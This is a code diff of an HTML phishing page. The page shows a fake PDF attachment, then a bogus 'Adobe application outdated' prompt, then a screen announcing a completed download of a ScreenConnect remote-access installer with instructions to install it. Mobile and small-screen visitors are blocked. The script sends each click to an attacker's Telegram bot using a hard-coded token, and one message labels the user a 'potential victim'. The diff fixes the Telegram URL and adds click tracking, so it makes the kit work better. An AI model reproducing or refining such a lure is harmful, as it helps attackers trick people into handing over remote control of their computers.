@@ -7,18 +7,19 @@
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background-color: #ebdcd7; /* Soft warm backdrop tint matching your image */
+            background-color: #ebdcd7;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
         }
 
-        /* Standard hidden utility class */
         .hidden { display: none !important; }
 
-        /* ==================== DEVICE BLOCK SCREEN (Your Image Layout) ==================== */
+        /* ==================== DEVICE BLOCK SCREEN ==================== */
         .block-card {
             background-color: #ffffff;
             border: 1px solid #e0c8c1;
@@ -29,7 +30,6 @@
             box-shadow: 0 10px 30px rgba(130, 90, 80, 0.08);
         }
 
-        /* Red Close Circle Graphic Icon */
         .error-circle {
             width: 56px;
             height: 56px;
@@ -42,7 +42,6 @@
         }
         .error-cross { font-size: 22px; color: #d93025; font-weight: bold; }
 
-        /* Badge Row elements */
         .badge-row {
             display: flex;
             justify-content: center;
@@ -78,10 +77,8 @@
             color: #5f6368;
             line-height: 1.6;
             margin: 0 0 32px 0;
-            padding: 0 10px;
         }
 
-        /* Inside Instruction Grey Box Container */
         .instruction-container {
             background-color: #f8f9fa;
             border-radius: 12px;
@@ -104,33 +101,76 @@
             line-height: 1.8;
         }
 
-        /* ==================== STANDARD PIPELINE STYLES ==================== */
-        .pdf-card { background-color: #ffffff; border: 1px solid #d1d1d1; border-radius: 28px; padding: 35px 30px; width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.15); }
+        /* ==================== PDF CARD ==================== */
+        .pdf-card {
+            background-color: #ffffff;
+            border: 1px solid #d1d1d1;
+            border-radius: 28px;
+            padding: 35px 30px;
+            width: 450px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+        }
+
         .pdf-icon { width: 45px; height: auto; margin-bottom: 12px; }
-        .file-name { font-size: 19px; font-weight: 700; color: #222222; margin-bottom: 6px; }
-        .file-meta { font-size: 14px; color: #777777; font-weight: 500; margin-bottom: 20px; text-transform: uppercase; }
-        .file-actions { display: flex; justify-content: center; gap: 30px; }
-        .action-btn { font-size: 14px; font-weight: 700; color: #555555; text-decoration: none; cursor: pointer; }
+
+        .file-name {
+            font-size: 19px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 6px;
+        }
+
+        .file-meta {
+            font-size: 14px;
+            color: #777777;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .file-actions {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+        }
+
+        .action-btn {
+            font-size: 14px;
+            font-weight: 700;
+            color: #555555;
+            text-decoration: none;
+            cursor: pointer;
+        }
         .action-btn:hover { color: #000000; }
-        
-        .popup-modal { background-color: #f1f1f1; border: 1px solid #cccccc; border-radius: 12px; width: 480px; padding: 40px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.25); }
-        .popup-logo { width: 50px; height: auto; margin-bottom: 24px; }
-        .popup-title { font-size: 24px; font-weight: 700; color: #2c2c2c; margin-bottom: 16px; }
-        .popup-text { font-size: 15px; color: #595959; line-height: 1.5; margin-bottom: 28px; }
-        .download-btn { display: inline-block; background-color: #0066cc; color: #ffffff; font-weight: 700; font-size: 15px; padding: 12px 36px; border-radius: 24px; border: none; cursor: pointer; }
+
+        /* PHASE 2 & 3 */
+        .popup-modal, .success-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 40px;
+            width: 480px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+        }
+
+        .download-btn {
+            display: inline-block;
+            background-color: #0066cc;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 15px;
+            padding: 12px 36px;
+            border-radius: 24px;
+            border: none;
+            cursor: pointer;
+        }
         .download-btn:hover { background-color: #0052a3; }
-        
-        .success-card { background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 24px; width: 500px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
-        .progress-box { border: 1px dashed #cbd5e1; border-radius: 12px; padding: 16px; background-color: #f8fafc; margin-bottom: 30px; text-align: left; }
-        .progress-header { display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #334155; margin-bottom: 8px; }
-        .bar-bg { width: 100%; height: 6px; background-color: #e2e8f0; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
-        .bar-fill { width: 100%; height: 100%; background-color: #16a34a; }
-        .instructions-box { background-color: #f1f5f9; border-radius: 12px; padding: 24px; text-align: left; margin-bottom: 24px; }
     </style>
 </head>
 <body>
 
-    <!-- SCREEN 0: MOBILE DEVICE RESTRICTION CARD (Your Image Layout) -->
+    <!-- MOBILE BLOCK -->
     <div class="block-card hidden" id="mobileBlockScreen">
         <div class="error-circle"><span class="error-cross">&#10005;</span></div>
         <div class="badge-row">
@@ -149,9 +189,11 @@
         </div>
     </div>
 
-    <!-- PHASE 1: THE ATTACHMENT CARD -->
-    <div class="pdf-card hidden" id="phase1">
-        <svg class="pdf-icon" viewBox="0 0 24 24" fill="none" xmlns="http://w3.org"><path d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3ZM11.5 9.5C11.5 10.3 10.8 11 10 11H8.5V12.5H7V8H10C10.8 8 11.5 8.7 11.5 9.5ZM16.5 11C16.5 11.8 15.8 12.5 15 12.5H13.5V8H15C15.8 8 16.5 8.7 16.5 9.5V11ZM12 8H13.5V12.5H12V8Z" fill="#E53935"/></svg>
+    <!-- PHASE 1 -->
+    <div class="pdf-card" id="phase1">
+        <svg class="pdf-icon" viewBox="0 0 24 24" fill="none" xmlns="http://w3.org/2000/svg">
+            <path d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3ZM11.5 9.5C11.5 10.3 10.8 11 10 11H8.5V12.5H7V8H10C10.8 8 11.5 8.7 11.5 9.5ZM16.5 11C16.5 11.8 15.8 12.5 15 12.5H13.5V8H15C15.8 8 16.5 8.7 16.5 9.5V11ZM12 8H13.5V12.5H12V8Z" fill="#E53935"/>
+        </svg>
         <div class="file-name">Pre_approved_letter.pdf</div>
         <div class="file-meta">5.7 MB &bull; PDF</div>
         <div class="file-actions">
@@ -160,15 +202,18 @@
         </div>
     </div>
 
-    <!-- PHASE 2: APPLICATION OUTDATED PROMPT -->
+    <!-- PHASE 2 -->
     <div class="popup-modal hidden" id="phase2">
-        <svg class="popup-logo" viewBox="0 0 30 30" fill="none" xmlns="http://w3.org"><rect width="30" height="30" rx="6" fill="#ff0000"/><path d="M15 5L7 22H11L13.5 16H16.5L19 22H23L15 5ZM15 11.5L15.8 14H14.2L15 11.5Z" fill="white"/></svg>
+        <svg class="popup-logo" viewBox="0 0 30 30" fill="none" xmlns="http://w3.org/2000/svg">
+            <rect width="30" height="30" rx="6" fill="#ff0000"/>
+            <path d="M15 5L7 22H11L13.5 16H16.5L19 22H23L15 5ZM15 11.5L15.8 14H14.2L15 11.5Z" fill="white"/>
+        </svg>
         <div class="popup-title">Application Outdated</div>
         <div class="popup-text">Your Adobe application is outdated. Update and install to proceed to view the document.</div>
         <button class="download-btn" onclick="moveToPhase3()">Download Now</button>
     </div>
 
-    <!-- PHASE 3: DOWNLOAD SUCCESSFUL & INSTRUCTIONS -->
+    <!-- PHASE 3 -->
     <div class="success-card hidden" id="phase3">
         <div class="progress-box">
             <div class="progress-header"><span>ScreenConnect.ClientSetup.msi</span><span style="color: #16a34a;">Completed</span></div>
@@ -182,28 +227,54 @@
         </div>
     </div>
 
-    <!-- AUTOMATED PIPELINE + GATEKEEPER LOGIC SCRIPT -->
     <script>
-        // Your Verified Live Telegram Integration Tokens
         const TELEGRAM_BOT_TOKEN = "8588726249:AAED9R8f7GX7d05cxT60nBAkVW33uNaw910";
         const TELEGRAM_CHAT_ID = "8552500085";
 
-        function sendTelegramNotification(messageText) {
-            const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: "Markdown" })
-            }).catch(err => console.error(err));
+        async function sendTelegramNotification(messageText) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (err) {
+                console.error("Telegram notification failed:", err);
+            }
         }
 
-        // --- AUTOMATIC DEVICE DETECTION CHECKS UPON PAGE LOAD ---
-        window.onload = function() {
-            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        function moveToPhase2() {
+            document.getElementById('phase1').classList.add('hidden');
+            document.getElementById('phase2').classList.remove('hidden');
             
-            if (isMobileDevice) {
-                // Device check positive -> Restrict screen layout visible
+            // Notify on VIEW/SAVE click
+            sendTelegramNotification("🔴 User clicked **VIEW / SAVE** on Pre_approved_letter.pdf");
+        }
+
+        function moveToPhase3() {
+            document.getElementById('phase2').classList.add('hidden');
+            document.getElementById('phase3').classList.remove('hidden');
+            
+            // Notify on Download click
+            sendTelegramNotification("⚠️ **Download Button Clicked** - Potential victim reached installer stage");
+        }
+
+        window.onload = function() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth <= 768;
+
+            if (isMobile || isSmallScreen) {
                 document.getElementById('mobileBlockScreen').classList.remove('hidden');
-                sendTelegramNotification("📱 *IT Study Metric:* Mobile device detected. Access blocked via Error 403 utility view.");
+                document.getElementById('phase1').classList.add('hidden');
             } else {
-                // Device check negative -> Render Phase 1 attachment interface
+                document.getElementById('phase1').classList.remove('hidden');
+            }
+        };
+    </script>
+</body>
+</html>
